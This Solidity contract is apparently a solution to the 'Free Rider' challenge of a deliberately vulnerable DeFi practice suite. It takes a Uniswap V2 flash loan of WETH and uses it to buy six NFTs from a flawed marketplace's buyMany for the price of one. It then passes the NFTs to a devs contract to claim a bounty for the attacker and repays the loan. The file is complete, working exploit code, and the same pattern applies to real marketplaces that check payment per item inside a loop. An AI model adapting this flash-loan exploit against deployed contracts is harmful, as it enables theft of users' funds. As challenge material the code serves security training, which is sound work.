// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "solmate/src/tokens/WETH.sol";
import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";

/**
 * @title FreeRiderAttacker
 * @author soyccan (soyccan@gmail.com)
 */
contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        // extract params
        (address nft, address payable nftMarket, address devsContract) = abi
            .decode(data, (address, address, address));

        // unwrap the borrowed WETH to ETH
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        bool wethIs0 = keccak256(abi.encodePacked(ERC20(token0).symbol())) ==
            keccak256(abi.encodePacked("WETH"));
        WETH weth = WETH(payable(wethIs0 ? token0 : token1));
        uint256 wethAmount = wethIs0 ? amount0 : amount1;
        weth.withdraw(wethAmount);

        // buy NFTs & give to devs to obtain bounty
        // wrap loops into function to avoid stack too deep
        buyNFTs(nftMarket, wethAmount);
        requestBounty(nft, devsContract, sender /* attacker */);

        // repay the loan with 0.3% fee
        uint256 repayAmount = wethAmount * 10031 / 10000;
        weth.deposit{value: repayAmount}();
        weth.transfer(msg.sender, repayAmount);
    }

    function buyNFTs(address payable nftMarket, uint256 amount) internal {
        // buy the NFTs
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; ) {
            tokenIds[i] = i;
            unchecked {
                i++;
            }
        }
        FreeRiderNFTMarketplace(nftMarket).buyMany{value: amount}(tokenIds);
    }

    function requestBounty(
        address nft,
        address devsContract,
        address recipient
    ) internal {
        // send the NFTs to devs & obtain the bounty
        for (uint256 i = 0; i < 6; ) {
            DamnValuableNFT(nft).safeTransferFrom(
                address(this), // from
                devsContract, // to
                i, // tokenId
                abi.encode(recipient) // data to send to NFT recipient (here is bounty recipient)
            );
            unchecked {
                i++;
            }
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        // confirm the transfer
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
